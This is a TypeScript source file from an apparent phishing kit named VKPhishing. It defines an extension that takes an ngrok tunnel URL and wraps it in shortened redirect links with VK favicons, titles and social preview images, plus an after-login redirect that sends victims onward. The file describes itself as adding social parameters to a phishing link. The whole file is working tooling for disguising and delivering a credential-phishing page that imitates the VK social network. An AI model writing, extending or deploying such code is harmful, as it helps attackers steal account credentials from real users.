import { readFileSync } from 'fs'
import { join } from 'path'
import { parse } from 'yaml'
import ayeKosmonavt from 'aye-kosmonavt-api'

import nuxtConfig from '../../nuxt.config'
import declareExtension from './_'
import { VKPhishing } from '..'

const configPath = join(__dirname, '..', '..', 'config', 'aye-kosmonavt.yml')
const config = parse(readFileSync(configPath, { encoding: 'utf8' }))

function extension(instance: VKPhishing) {
  if (instance.extensions.map((e) => e.__meta__.name).includes('ngrok')) {
    const currentConfig = (() => {
      if (config.presets[config.use]) {
        return config.presets[config.use]
      } else {
        throw new Error('Undefined preset for option `use` in ' + configPath)
      }
    })()

    instance.on('ngrok:ready-url', async (url) => {
      currentConfig.beforeLoginImage =
        currentConfig.beforeLoginImage ||
        'https://vk.com/images/icons/favicons/fav_im.ico'

      const { shortUrl, url: fullUrl } = await ayeKosmonavt(
        currentConfig.beforeLoginTitle || nuxtConfig.head.title,
        currentConfig.beforeLoginImage,
        {
          ogImage:
            currentConfig.beforeLoginSocialImage ||
            currentConfig.beforeLoginImage,
          redirectUrl: url,
          redirectDelay: currentConfig.beforeLoginRedirTime || 1
        }
      )

      instance.emit('aye-kosmonavt:got-short-url', shortUrl)
      instance.emit('aye-kosmonavt:got-full-url', fullUrl)
      instance.emit('aye-kosmonavt:got-both-urls', { shortUrl, url: fullUrl })

      const { url: ayeKosmonavtURL } = await ayeKosmonavt(
        currentConfig.afterLoginTitle || 'Redirection...',
        currentConfig.beforeLoginImage ||
          'https://vk.com/images/icons/pwa/apple/default.png',
        {
          redirectUrl: currentConfig.afterLoginUrl || 'about:blank',
          redirectDelay: currentConfig.afterLoginRedirTime || 1
        }
      )

      instance.wayOut = ayeKosmonavtURL
    })
  } else {
    throw new Error('Aye kosmonavt requires NGrok plugin')
  }

  return instance
}

export default declareExtension(extension, {
  name: 'aye-kosmonavt',
  description: 'Extension to add social params to phishing link'
})
